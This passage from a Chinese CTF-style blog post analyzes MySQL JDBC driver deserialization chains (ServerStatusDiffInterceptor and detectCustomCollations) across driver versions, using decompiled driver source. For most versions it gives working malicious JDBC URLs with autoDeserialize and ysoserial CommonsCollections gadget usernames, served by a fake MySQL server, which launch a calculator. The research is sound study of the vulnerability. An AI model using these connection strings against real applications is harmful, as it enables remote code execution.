<h2 id="（3）5-1-11-5-x-xx"><a href="#（3）5-1-11-5-x-xx" class="headerlink" title="（3）5.1.11-5.x.xx"></a>（3）5.1.11-5.x.xx</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>


<h2 id="（4）6-x"><a href="#（4）6-x" class="headerlink" title="（4）6.x"></a>（4）6.x</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>


<h2 id="（5）8-20以后"><a href="#（5）8-20以后" class="headerlink" title="（5）8.20以后"></a>（5）8.20以后</h2><p>这以后进入<code>populateMapWithSessionStatusValues</code>后不会再调用getObject，因此直接GG</p>
<h1 id="三、detectCustomCollations链"><a href="#三、detectCustomCollations链" class="headerlink" title="三、detectCustomCollations链"></a>三、detectCustomCollations链</h1><h2 id="（1）6-0-2-6-0-6"><a href="#（1）6-0-2-6-0-6" class="headerlink" title="（1）6.0.2-6.0.6"></a>（1）6.0.2-6.0.6</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Connection conn=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections7_calc&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections7_calc&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        conn = DriverManager.getConnection(url, username, password);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里username有讲究，用到了一个开源工具fake_mysql:<br><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a><br>用法自己查找，需要注意的有2点，python版本低于3.8，然后config.json里面的路径中的反斜杠用2个，这样就不会报错<br>之后运行直接弹计算机<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678513800945-953b5105-27c3-4c7c-bdaa-37486bd0eb7f.png#averageHue=%232f302a&clientId=u79845661-19e7-4&from=paste&height=922&id=ucd959cb4&name=image.png&originHeight=1152&originWidth=2302&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3508959&status=done&style=none&taskId=uef656d29-eb24-44d0-ab73-9cdd00eb0ba&title=&width=1841.6" alt="image.png"><br>也是下断点看看：<br>直接到不同的地方看看，也会进入createNewIo这个方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678514155155-9c83651b-17f1-41c1-95cf-1c22238aee7b.png#averageHue=%23292a26&clientId=u79845661-19e7-4&from=paste&height=223&id=u33b8b3d4&name=image.png&originHeight=279&originWidth=1033&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=404532&status=done&style=none&taskId=ueb575335-52ec-4752-8cac-640f4ed36f8&title=&width=826.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678514179103-126f1052-f9bb-4d52-a6f1-d383eced5941.png#averageHue=%2330312c&clientId=u79845661-19e7-4&from=paste&height=278&id=uce516b6c&name=image.png&originHeight=348&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=561010&status=done&style=none&taskId=ua5d5532f-24c0-4d0b-bb2e-70f3b5d0930&title=&width=881.6" alt="image.png"><br>调用相同的方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678514187825-9bfcbe51-a28e-4add-8d99-81c7d179c8aa.png#averageHue=%232e2f2b&clientId=u79845661-19e7-4&from=paste&height=462&id=u3e68c67f&name=image.png&originHeight=577&originWidth=1168&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=986635&status=done&style=none&taskId=u0920b3b7-c737-4955-bfd0-addf6f20815&title=&width=934.4" alt="image.png"><code>initializePropsFromServer()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678514198507-a8e0d34d-d6ba-4421-bdcc-90dfdea0cf4f.png#averageHue=%232d2d29&clientId=u79845661-19e7-4&from=paste&height=148&id=u7b2675ac&name=image.png&originHeight=185&originWidth=892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=226173&status=done&style=none&taskId=u629119a6-996d-46c3-861b-e4d807b06c5&title=&width=713.6" alt="image.png"><br>在这里就有所不同了，这里咱们调用了<code>buildCollationMapping()</code>方法。跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678514227664-1a998b83-3807-41f6-8141-7a9ceede101b.png#averageHue=%23282824&clientId=u79845661-19e7-4&from=paste&height=197&id=ud534c9e2&name=image.png&originHeight=246&originWidth=1174&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=412789&status=done&style=none&taskId=u0a10d88d-d33a-4c02-a358-c4b5ef47875&title=&width=939.2" alt="image.png"><br>之前这里是允许SHOW SESSION STATUS，这里是SHOW COLLATION,不管命令是什么，都调用了<code>ResultSetUtil.resultSetToMap</code>，然后就是之前同样的一套流程按摩</p>
<h2 id="（2）8-x-x"><a href="#（2）8-x-x" class="headerlink" title="（2）8.x.x"></a>（2）8.x.x</h2><p>在initializePropsFromServer()方法中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initializePropsFromServer</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">connectionInterceptorClasses</span> <span class="operator">=</span> <span class="built_in">this</span>.getPropertySet().getStringReadableProperty(<span class="string">&quot;connectionLifecycleInterceptors&quot;</span>).getStringValue();</span><br><span class="line">    <span class="built_in">this</span>.connectionLifecycleInterceptors = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (connectionInterceptorClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.connectionLifecycleInterceptors = (List)Util.loadClasses(<span class="built_in">this</span>.getPropertySet().getStringReadableProperty(<span class="string">&quot;connectionLifecycleInterceptors&quot;</span>).getStringValue(), <span class="string">&quot;Connection.badLifecycleInterceptor&quot;</span>, <span class="built_in">this</span>.getExceptionInterceptor()).stream().map((o) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> o.init(<span class="built_in">this</span>, <span class="built_in">this</span>.props, <span class="built_in">this</span>.session.getLog());</span><br><span class="line">            &#125;).collect(Collectors.toList());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CJException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> SQLExceptionsMapping.translateException(var8, <span class="built_in">this</span>.getExceptionInterceptor());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.session.setSessionVariables();</span><br><span class="line">    <span class="keyword">if</span> ((Boolean)<span class="built_in">this</span>.useServerPrepStmts.getValue()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.useServerPreparedStmts = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.session.loadServerVariables(<span class="built_in">this</span>.getConnectionMutex(), <span class="built_in">this</span>.dbmd.getDriverVersion());</span><br><span class="line">    <span class="built_in">this</span>.autoIncrementIncrement = <span class="built_in">this</span>.session.getServerVariable(<span class="string">&quot;auto_increment_increment&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//调用buildCollationMapping()方法</span></span><br><span class="line">    <span class="built_in">this</span>.session.buildCollationMapping();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        LicenseConfiguration.checkLicenseType(<span class="built_in">this</span>.session.getServerVariables());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CJException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> SQLError.createSQLException(var7.getMessage(), <span class="string">&quot;08001&quot;</span>, <span class="built_in">this</span>.getExceptionInterceptor());</span><br><span class="line">    &#125;</span><br><span class="line">com.mysql.cj.mysqla.MysqlaSession#buildCollationMapping()方法</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buildCollationMapping</span><span class="params">()</span> &#123;</span><br><span class="line">    Map&lt;Integer, String&gt; customCharset = <span class="literal">null</span>;</span><br><span class="line">    Map&lt;String, Integer&gt; customMblen = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">databaseURL</span> <span class="operator">=</span> <span class="built_in">this</span>.hostInfo.getDatabaseUrl();</span><br><span class="line">    <span class="keyword">if</span> ((Boolean)<span class="built_in">this</span>.cacheServerConfiguration.getValue()) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(customIndexToCharsetMapByUrl) &#123;</span><br><span class="line">            customCharset = (Map)customIndexToCharsetMapByUrl.get(databaseURL);</span><br><span class="line">            customMblen = (Map)customCharsetToMblenMapByUrl.get(databaseURL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (customCharset == <span class="literal">null</span> &amp;&amp; (Boolean)<span class="built_in">this</span>.getPropertySet().getBooleanReadableProperty(<span class="string">&quot;detectCustomCollations&quot;</span>).getValue()) &#123;</span><br><span class="line">        customCharset = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        customMblen = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ValueFactory&lt;Integer&gt; ivf = <span class="keyword">new</span> <span class="title class_">IntegerValueFactory</span>();</span><br><span class="line"></span><br><span class="line">        PacketPayload resultPacket;</span><br><span class="line">        Resultset rs;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//此处不再调用getObject()方法，此链失效</span></span><br><span class="line">            resultPacket = <span class="built_in">this</span>.sendCommand(<span class="built_in">this</span>.commandBuilder.buildComQuery(<span class="built_in">this</span>.getSharedSendPacket(), <span class="string">&quot;SHOW COLLATION&quot;</span>), <span class="literal">false</span>, <span class="number">0</span>);</span><br><span class="line">            rs = <span class="built_in">this</span>.protocol.readAllResults(-<span class="number">1</span>, <span class="literal">false</span>, resultPacket, <span class="literal">false</span>, (ColumnDefinition)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ResultsetFactory</span>(Type.FORWARD_ONLY, (Resultset.Concurrency)<span class="literal">null</span>));</span><br><span class="line">            ValueFactory&lt;String&gt; svf = <span class="keyword">new</span> <span class="title class_">StringValueFactory</span>(rs.getColumnDefinition().getFields()[<span class="number">1</span>].getEncoding());</span><br><span class="line"></span><br><span class="line">            Row r;</span><br><span class="line">            <span class="keyword">while</span>((r = (Row)rs.getRows().next()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">collationIndex</span> <span class="operator">=</span> ((Number)r.getValue(<span class="number">2</span>, ivf)).intValue();</span><br><span class="line">                <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> (String)r.getValue(<span class="number">1</span>, svf);</span><br><span class="line">                <span class="keyword">if</span> (collationIndex &gt;= <span class="number">2048</span> || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) &#123;</span><br><span class="line">                    ((Map)customCharset).put(collationIndex, charsetName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!CharsetMapping.CHARSET_NAME_TO_CHARSET.containsKey(charsetName)) &#123;</span><br><span class="line">                    ((Map)customMblen).put(charsetName, (Object)<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PasswordExpiredException var17) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((Boolean)<span class="built_in">this</span>.disconnectOnExpiredPasswords.getValue()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var17;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ExceptionFactory.createException(var18.getMessage(), var18, <span class="built_in">this</span>.exceptionInterceptor);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>在buildCollationMapping中不再调用<code>ResultSetUtil.resultSetToMap</code><br>寄了</p>
<h2 id="（3）5-1-49"><a href="#（3）5-1-49" class="headerlink" title="（3）5.1.49"></a>（3）5.1.49</h2><p>在buildCollation里：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildCollationMapping</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (customCharset == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.getDetectCustomCollations() &amp;&amp; <span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    java.sql.<span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        customCharset = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        customMblen = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        stmt = <span class="built_in">this</span>.getMetadataSafeStatement();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line">                <span class="comment">//不再调用getObject()</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">collationIndex</span> <span class="operator">=</span> results.getInt(<span class="number">3</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> results.getString(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (collationIndex &gt;= <span class="number">2048</span> || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) &#123;</span><br><span class="line">                    ((Map)customCharset).put(collationIndex, charsetName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!CharsetMapping.CHARSET_NAME_TO_CHARSET.containsKey(charsetName)) &#123;</span><br><span class="line">                    ((Map)customMblen).put(charsetName, (Object)<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
<p>也不调用resultSeToMap了<br>寄了</p>
<h2 id="（4）5-1-41-5-1-48"><a href="#（4）5-1-41-5-1-48" class="headerlink" title="（4）5.1.41-5.1.48"></a>（4）5.1.41-5.1.48</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>


<h2 id="（5）5-1-29-5-1-40"><a href="#（5）5-1-29-5-1-40" class="headerlink" title="（5）5.1.29-5.1.40"></a>（5）5.1.29-5.1.40</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>

<h2 id="（6）5-1-19-5-1-28"><a href="#（6）5-1-19-5-1-28" class="headerlink" title="（6）5.1.19-5.1.28"></a>（6）5.1.19-5.1.28</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>

<h2 id="（7）5-1-19以下"><a href="#（7）5-1-19以下" class="headerlink" title="（7）5.1.19以下"></a>（7）5.1.19以下</h2><p>不调用resultSeToMap<br>寄了</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">被我忘掉的Hessian反序列化</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/10/%E5%B4%AD%E6%96%B0%E5%87%BA%E5%8E%82%E7%9A%84Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">崭新出厂的Python原型链污染</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>